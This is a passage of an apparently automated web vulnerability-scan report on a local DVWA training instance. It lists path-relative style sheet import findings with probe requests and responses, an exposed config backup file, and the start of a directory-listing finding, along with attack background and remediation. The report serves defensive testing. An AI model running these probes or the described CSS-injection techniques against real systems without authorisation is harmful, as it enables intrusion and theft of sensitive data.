    <li><a href="https://capec.mitre.org/data/definitions/31.html">CAPEC-31: Accessing/Intercepting/Modifying HTTP Cookies</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/ HTTP/1.1<br>Host: localhost:7878<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 302 Found<br>Date: Fri, 11 Mar 2022 07:03:43 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br><span class="HIGHLIGHT">Set-Cookie: PHPSESSID=lub2ldtl1n19g18t95thn5uipg; path=/</span><br>Expires: Thu, 19 Nov 1981 08:52:00 GMT<br>Cache-Control: no-store, no-cache, must-revalidate<br>Pragma: no-cache<br><span class="HIGHLIGHT">Set-Cookie: PHPSESSID=lub2ldtl1n19g18t95thn5uipg; path=/</span><br>Set-Cookie: security=low<br>Location: login.php<br>Content-Length: 0<br>Connection: close<br>Content-Type: text/html; charset=UTF-8<br><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="3.2">3.2.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00200328_pathrelativestylesheetimport">Path-relative style sheet import</a></span>
<br><a class="PREVNEXT" href="#3.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#4.1">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_firm_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Firm</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>
<ol>
<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at "/original-path/file.php" might import "styles/main.css").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, "/original-path/file.php/extra-junk/"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>
<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL "/original-path/file.php/extra-junk/styles/main.css"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>
<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>
<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>
<ul>
  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>
<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>
<ul><li>Setting the HTTP response header "X-Frame-Options: deny" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. "&lt;!doctype html&gt;") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>
<li>Setting the HTTP response header "X-Content-Type-Options: nosniff" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul></span>
<h2>References</h2>
<span class="TEXT"><ul><li><a href="https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/154.html">CAPEC-154: Resource Location Spoofing</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/468.html">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/ HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=oqjhrapj7unj2762egunqkglq3<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:29:51 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 6334<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Welcome :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="dvwa/css/main.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 2</h2>
<div class="rr_div"><span>GET /dvwa/<span class="HIGHLIGHT">index.php/ekgvcx/</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=oqjhrapj7unj2762egunqkglq3<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:37:25 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 6334<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Welcome :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="dvwa/css/main.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 3</h2>
<div class="rr_div"><span>GET <span class="HIGHLIGHT">/dvwa/index.php/ekgvcx/dvwa/css/main.css</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=oqjhrapj7unj2762egunqkglq3<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 3</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:37:25 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 6334<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Welcome :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*&lt;/t<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH0" id="4">4.&nbsp;http://localhost:7878/dvwa/about.php</span>
<br><a class="PREVNEXT" href="#3">Previous</a>
&nbsp;<a class="PREVNEXT" href="#5">Next</a>
<br>
<span class="BODH1" id="4.1">4.1.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00200328_pathrelativestylesheetimport">Path-relative style sheet import</a></span>
<br><a class="PREVNEXT" href="#3.2">Previous</a>
&nbsp;<a class="PREVNEXT" href="#5.1">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_firm_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Firm</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/about.php</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>
<ol>
<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at "/original-path/file.php" might import "styles/main.css").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, "/original-path/file.php/extra-junk/"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>
<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL "/original-path/file.php/extra-junk/styles/main.css"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>
<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>
<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>
<ul>
  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>
<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>
<ul><li>Setting the HTTP response header "X-Frame-Options: deny" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. "&lt;!doctype html&gt;") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>
<li>Setting the HTTP response header "X-Content-Type-Options: nosniff" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul></span>
<h2>References</h2>
<span class="TEXT"><ul><li><a href="https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/154.html">CAPEC-154: Resource Location Spoofing</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/468.html">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/about.php HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=fp92t1q831u385r566b9u9fkbu<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:30:01 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 5675<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;About :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="dvwa/css/main.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 2</h2>
<div class="rr_div"><span>GET /dvwa/about.php<span class="HIGHLIGHT">/v2ne6j/</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=fp92t1q831u385r566b9u9fkbu<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:33:07 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 5675<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;About :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="dvwa/css/main.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 3</h2>
<div class="rr_div"><span>GET <span class="HIGHLIGHT">/dvwa/about.php/v2ne6j/dvwa/css/main.css</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=fp92t1q831u385r566b9u9fkbu<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 3</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:33:07 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 5675<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;About :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*&lt;/tit<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH0" id="5">5.&nbsp;http://localhost:7878/dvwa/config/config.inc.php</span>
<br><a class="PREVNEXT" href="#4">Previous</a>
&nbsp;<a class="PREVNEXT" href="#6">Next</a>
<br>
<span class="BODH1" id="5.1">5.1.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/006000d8_backupfile">Backup file</a></span>
<br><a class="PREVNEXT" href="#4.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#6.1">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/config/config.inc.php</b></td>
</tr>
</table>
<h2>Issue description</h2>
<span class="TEXT"><p>Publicly accessible backups and outdated copies of files can provide attackers with extra attack surface. Depending on the server configuration and file type, they may also expose source code, configuration details, and other information intended to remain secret.</p></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>Review the file to identify whether it's intended to be publicly accessible, and remove it from the server's web root if it isn't. It may also be worth auditing the server contents to find other outdated files, and taking measures to prevent the problem from reoccurring. </p></span>
<h2>References</h2>
<span class="TEXT"><ul>
    <li><a href="https://portswigger.net/web-security/information-disclosure/exploiting#source-code-disclosure-via-backup-files">Web Security Academy: Information disclosure via backup files</a></li>
</ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
    <li><a href="https://cwe.mitre.org/data/definitions/530.html">CWE-530: Exposure of Backup File to an Unauthorized Control Sphere</a></li>
    <li><a href="https://capec.mitre.org/data/definitions/37.html">CAPEC-37: Retrieve Embedded Sensitive Data</a></li>
    <li><a href="https://capec.mitre.org/data/definitions/204.html">CAPEC-204: Lifting Sensitive Data Embedded in Cache</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET <span class="HIGHLIGHT">/dvwa/config/config.inc.php.bak</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=gcs1u3jkvoi2nn6rch31clmpaa<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 <span class="HIGHLIGHT">200</span> OK<br>Date: Fri, 11 Mar 2022 07:37:26 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>Last-Modified: <span class="HIGHLIGHT">Fri, 11 Mar 2022 07:37:25 GMT</span><br>ETag: <span class="HIGHLIGHT">"957-5d9ec66e0d002"</span><br>Accept-Ranges: bytes<br>Content-Length: <span class="HIGHLIGHT">2391</span><br>Connection: close<br>Content-Type: <span class="HIGHLIGHT">text/html</span><br><br><span class="HIGHLIGHT">&lt;?php</span><br><br># If you are having problems connecting to the MySQL database and all of the variables below are correct<br># try changing the 'db_server' variable from localhost to 127.0.0.1. Fixes a problem due to<br><b>...[SNIP]...</b><br> other services, just these two labs.<br>#   If you do not understand what this means, do not change it.<br>$_DVWA["SQLI_DB"] = MYSQL;<br>#$_DVWA["SQLI_DB"] = SQLITE;<br>#$_DVWA["SQLITE_DB"] = "sqli.db";<br><br>?&gt;<span class="HIGHLIGHT"><br></span></span></div>
<h2>Request 2</h2>
<div class="rr_div"><span>GET <span class="HIGHLIGHT">/dvwa/config/pbxd.inc.php.bak</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=gcs1u3jkvoi2nn6rch31clmpaa<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 <span class="HIGHLIGHT">404</span> Not Found<br>Date: Fri, 11 Mar 2022 07:37:26 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>Content-Length: <span class="HIGHLIGHT">297</span><br>Connection: close<br>Content-Type: <span class="HIGHLIGHT">text/html; charset=iso-8859-1</span><br><br><span class="HIGHLIGHT">&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;</span><span class="HIGHLIGHT"><br></span><span class="HIGHLIGHT">&lt;html&gt;&lt;head&gt;<br>&lt;title&gt;404 Not Found&lt;/title&gt;<br>&lt;/head&gt;&lt;body&gt;<br>&lt;h1&gt;Not Found&lt;/h1&gt;<br>&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;<br>&lt;hr&gt;<br>&lt;address&gt;Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2 Server at localhost Port 7878&lt;/address&gt;<br>&lt;/body&gt;&lt;/html&gt;</span><span class="HIGHLIGHT"><br></span></span></div>
<div class="rule"></div>
<span class="BODH0" id="6">6.&nbsp;http://localhost:7878/dvwa/hackable/</span>
<br><a class="PREVNEXT" href="#5">Previous</a>
&nbsp;<a class="PREVNEXT" href="#7">Next</a>
<br>
<span class="BODH1" id="6.1">6.1.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00600100_directorylisting">Directory listing</a></span>
<br><a class="PREVNEXT" href="#5.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#7.1">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_firm_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Firm</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/hackable/</b></td>
</tr>
</table>
<h2>Issue description</h2>
